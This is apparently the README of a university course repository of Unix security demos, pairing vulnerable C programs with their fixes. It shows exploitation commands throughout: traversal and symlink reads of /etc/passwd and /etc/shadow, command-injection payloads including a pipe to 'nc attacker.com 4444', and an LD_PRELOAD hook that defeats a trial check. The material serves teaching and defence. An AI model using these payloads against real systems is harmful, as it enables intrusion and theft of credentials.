# EC521 Unix Security Vulnerability Demos

This repository contains hands-on demonstrations of common Unix security vulnerabilities and their mitigations. Each vulnerability is presented with a vulnerable version, an explanation of why naive fixes fail, and a properly secured implementation.

## Repository Structure

```
ec521-unix-demos/
├── directory-traversal/     # Path traversal vulnerability
├── command-injection/       # Shell command injection vulnerability
├── toctou/                  # Time-of-Check to Time-of-Use race condition
├── kernel-capabilities/     # Binding port 80: root vs. Linux capabilities
└── ld-preload/              # Function interposition with LD_PRELOAD
```

---

## 1. Directory Traversal

**Location:** `directory-traversal/`

Directory traversal (also known as path traversal) allows attackers to access files outside the intended directory by manipulating file paths.

### Source Files

| File | Description |
|------|-------------|
| `docserver.c` | Vulnerable version - no path validation |
| `docserver_naive_fix.c` | Flawed fix - string-based check (still exploitable) |
| `docserver_secure.c` | Secure fix - uses `realpath()` for canonical path validation |

### The Vulnerability (`docserver.c`)

The vulnerable server directly concatenates user input into a file path:

```c
snprintf(filepath, sizeof(filepath), "%s%s", BASE_DIR, argv[1]);
```

**Exploitation:**
```bash
./docserver ../secret_config.txt    # Escapes public/ directory
./docserver ../../etc/passwd        # Reads system files
```

### Why the Naive Fix Fails (`docserver_naive_fix.c`)

The naive fix checks for `..` patterns in the string:

```c
if (strstr(path, "..") != NULL) return 0;  // INSUFFICIENT!
```

**Problem:** Symlinks bypass string-based checks entirely.

**Exploitation via symlink:**
```bash
cd public/
ln -s /etc etc_escape
cd ..
./docserver_naive etc_escape/passwd   # Bypasses check, reads /etc/passwd
```

### The Secure Fix (`docserver_secure.c`)

Uses `realpath()` to resolve the canonical (absolute, symlink-resolved) path:

```c
char *resolved_base = realpath(BASE_DIR, NULL);
char *resolved_path = realpath(filepath, NULL);
// Compare resolved paths to ensure file is within allowed directory
```

**Why it works:** `realpath()` resolves all symlinks and normalizes `../` sequences, revealing the true filesystem location before any access occurs.

### Building and Testing

```bash
cd directory-traversal
make all                    # Build all versions
make demo-attack            # Demonstrate the vulnerability
make setup-symlink-attack   # Create symlink for bypass demo
make demo-compare-symlink   # Compare naive vs secure against symlink attack
make clean                  # Remove binaries
```

---

## 2. Command Injection

**Location:** `command-injection/`

Command injection occurs when user input is passed to a shell, allowing attackers to execute arbitrary commands.

### Source Files

| File | Description |
|------|-------------|
| `vuln_ping.c` | Vulnerable version - uses `system()` with user input |
| `fixed_ping_validation.c` | Fix #1 - Input validation (allowlist approach) |
| `fixed_ping_execve.c` | Fix #2 - Uses `execve()` to avoid shell |
| `fixed_ping_library.c` | Fix #3 - Uses library calls (no external process) |

### The Vulnerability (`vuln_ping.c`)

User input is concatenated into a shell command:

```c
snprintf(command, sizeof(command), "ping -c 3 %s", target);
system(command);  // Shell interprets metacharacters!
```

**Exploitation:**
```bash
./vuln_ping "example.com; cat /etc/passwd"
./vuln_ping "example.com | nc attacker.com 4444"
./vuln_ping '$(whoami)'
./vuln_ping '`id`'
```

### Fix #1: Input Validation (`fixed_ping_validation.c`)

Allowlist validation permits only safe characters:

```c
int is_valid_target(const char *target) {
    // Only allow: a-z, A-Z, 0-9, '.', '-', ':'
    for (int i = 0; target[i]; i++) {
        if (!isalnum(target[i]) && target[i] != '.' &&
            target[i] != '-' && target[i] != ':') {
            return 0;
        }
    }
    return 1;
}
```

**When to use:** When input format is well-defined (hostnames, IP addresses).

### Fix #2: Avoid the Shell (`fixed_ping_execve.c`)

Uses `fork()` + `execve()` instead of `system()`:

```c
char *args[] = {"/sbin/ping", "-c", "3", target, NULL};
execve(args[0], args, NULL);
```

**Why it works:** `execve()` does not invoke a shell, so metacharacters like `;` and `|` are treated as literal characters in the argument.

### Fix #3: Library Calls (`fixed_ping_library.c`)

Implements ICMP ping directly using raw sockets, eliminating the need for any external process.

**Why it works:** User input never reaches a shell or external program; it only flows to networking functions.

**Trade-off:** Requires root privileges or `CAP_NET_RAW` capability.

### Summary of Approaches

| Approach | Pros | Cons |
|----------|------|------|
| Input Validation | Simple, no privilege changes | Must anticipate all attack vectors |
| `execve()` | No shell interpretation | Still executes external program |
| Library Calls | Complete control, no external process | More complex, may need privileges |

---

## 3. TOCTOU (Time-of-Check to Time-of-Use)

**Location:** `toctou/`

TOCTOU is a race condition where the state of a resource changes between checking it and using it.

### Source Files

| File | Description |
|------|-------------|
| `toctou.c` | Vulnerable version - gap between `access()` and `fopen()` |
| `toctou-secure.c` | Secure fix - uses file descriptors to eliminate race window |

### The Vulnerability (`toctou.c`)

The program checks permissions, then opens the file:

```c
// TIME OF CHECK: Does the real user have access?
if (access(filename, R_OK) != 0) {
    return 1;  // Deny
}

sleep(60);  // RACE WINDOW (exaggerated for demo)

// TIME OF USE: Open with effective UID (possibly root in setuid program)
FILE *fp = fopen(filename, "r");
```

**The problem in setuid programs:**
- `access()` checks permissions using the **real UID** (the actual user)
- `fopen()` opens the file using the **effective UID** (possibly root)

**Exploitation:**
```bash
# Terminal 1: Start the vulnerable program
./toctou safe_file.txt

# Terminal 2: During the sleep window, swap the symlink
rm safe_file.txt
ln -s /etc/shadow safe_file.txt

# Result: Program reads /etc/shadow with root privileges
```

### The Secure Fix (`toctou-secure.c`)

Opens first, then checks on the file descriptor:

```c
// Open immediately with O_NOFOLLOW (refuse to follow symlinks)
int fd = open(filename, O_RDONLY | O_NOFOLLOW);

// Check permissions on the ALREADY-OPENED file descriptor
struct stat st;
fstat(fd, &st);  // fstat uses fd, not pathname

// Manual permission check against real UID
check_real_user_access(&st);

// Read from the file descriptor
read(fd, buffer, sizeof(buffer));
```

**Why it works:**
1. `O_NOFOLLOW` prevents symlink attacks at open time
2. File descriptor is bound to a specific inode
3. Symlink swaps after opening cannot affect which file is read
4. No gap between check and use - they operate on the same open file

### Key Takeaways

| Vulnerable Pattern | Secure Pattern |
|-------------------|----------------|
| `access()` then `fopen()` | `open()` then `fstat()` |
| Check pathname, use pathname | Open once, operate on descriptor |
| Gap between check and use | Atomic: check what you already opened |

---

## 4. Linux Capabilities (Binding Port 80)

**Location:** `kernel-capabilities/` (Linux only)

The kernel only lets a process bind ports below 1024 if it holds `CAP_NET_BIND_SERVICE`. The traditional way to get it is to run as root, which grants every privilege. Capabilities split root's power into individual pieces so a program can be given just the one it needs.

### Source Files

| File | Description |
|------|-------------|
| `bind80_root.c` | Binds port 80 by running as root - keeps all capabilities |
| `bind80_caps.c` | Binds port 80 as a normal user via a file capability, then drops it |

### Approach 1: Run as Root (`bind80_root.c`)

```bash
./bind80_root        # Fails: bind(80) failed: Permission denied
sudo ./bind80_root   # Works, but the process holds ALL capabilities
```

The program prints its `uid`/`euid` and the `Cap*` lines from `/proc/self/status`. After the bind it is still root with every capability while it handles untrusted network input, so a single bug compromises the whole machine.

### Approach 2: Capabilities (`bind80_caps.c`)

Grant the binary exactly one capability:

```bash
sudo setcap cap_net_bind_service=+ep ./bind80_caps
./bind80_caps        # Runs as a normal user, binds port 80
```

After `bind()` the program clears all its capability sets with the `capset` syscall:

```c
struct __user_cap_header_struct hdr = { _LINUX_CAPABILITY_VERSION_3, 0 };
struct __user_cap_data_struct data[2] = {0};
syscall(SYS_capset, &hdr, data);
```

`CapEff` goes from `0000000000000400` (bit 10, `CAP_NET_BIND_SERVICE`) to all zeros, so the code that serves requests has no special privileges at all.

### Comparison

| | Root | Capabilities |
|---|------|--------------|
| `uid` | 0 | Normal user |
| Privileges held | All | Only `CAP_NET_BIND_SERVICE` |
| Privileges while serving | All | None (dropped after bind) |
| Impact of a bug | Full system compromise | Unprivileged process |

### Caveat: Docker

Docker defaults `net.ipv4.ip_unprivileged_port_start` to 0, so any user can bind port 80 and the "fails" demos will succeed. Use `--sysctl net.ipv4.ip_unprivileged_port_start=1024`. `setcap` also does not work on some filesystems (e.g., bind-mounted host directories), so build inside the container or VM.

### Building and Testing

```bash
cd kernel-capabilities
make all                # Build both versions
make demo-root-fails    # Normal user, no capability: EACCES
make demo-root          # sudo: works, holds all capabilities
make demo-caps-fails    # Before setcap: EACCES
make demo-caps          # setcap, then bind as a normal user and drop the cap
make show-caps          # From a second terminal: inspect running servers
make unsetcap           # Remove the file capability
make clean              # Remove binaries
```

---

## 5. LD_PRELOAD (Function Interposition)

**Location:** `ld-preload/` (Linux only)

The dynamic linker resolves libc functions at run time, searching libraries listed in `LD_PRELOAD` *before* libc. Whoever controls a process's environment can therefore replace its library calls without modifying the binary.

### Source Files

| File | Description |
|------|-------------|
| `victim.c` | Calls `time()` to decide whether a trial has expired |
| `hook.c` | Shared library that replaces `time()` with a fixed fake date |

### The Demo

```c
// hook.c - replaces libc's time()
time_t time(time_t *tloc) {
    time_t fake = 1717200000;   // 2024-06-01
    if (tloc) *tloc = fake;
    return fake;
}
```

```bash
cd ld-preload
gcc -o victim victim.c
gcc -shared -fPIC -o hook.so hook.c

./victim                        # Trial expired
LD_PRELOAD=./hook.so ./victim   # Trial active (same binary, fake clock)
```

### Why It Matters

- The program's logic is unchanged; only the answer from `time()` differs.
- Any check that trusts a libc call (time, uid, randomness) can be subverted by whoever sets the environment.
- Interposition is **not** a security boundary. Static linking or raw syscalls bypass it, and setuid binaries ignore `LD_PRELOAD` (the dynamic linker enters secure-execution mode).

---

## General Security Principles

1. **Never trust user input** - Always validate and sanitize
2. **Use allowlists, not blocklists** - Define what IS allowed, not what isn't
3. **Validate at the right level** - String checks are insufficient; validate actual resources
4. **Minimize the attack window** - Eliminate gaps between checking and using
5. **Principle of least privilege** - Don't run with more permissions than needed (e.g., grant one capability instead of running as root, and drop it when done)
6. **Prefer library functions over shell commands** - Avoid shell interpretation entirely when possible

---

## Building All Demos

```bash
# Build everything
make -C directory-traversal all
make -C command-injection all
make -C toctou all
make -C kernel-capabilities all   # Linux only
# ld-preload: compile by hand (see section 5)

# Clean everything
make -C directory-traversal clean
make -C command-injection clean
make -C toctou clean
make -C kernel-capabilities clean
```

---

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- `man 3 realpath`
- `man 2 execve`
- `man 2 open` (see `O_NOFOLLOW`)
- `man 7 capabilities`
- `man 8 setcap`
- `man 8 ld.so` (see `LD_PRELOAD`)
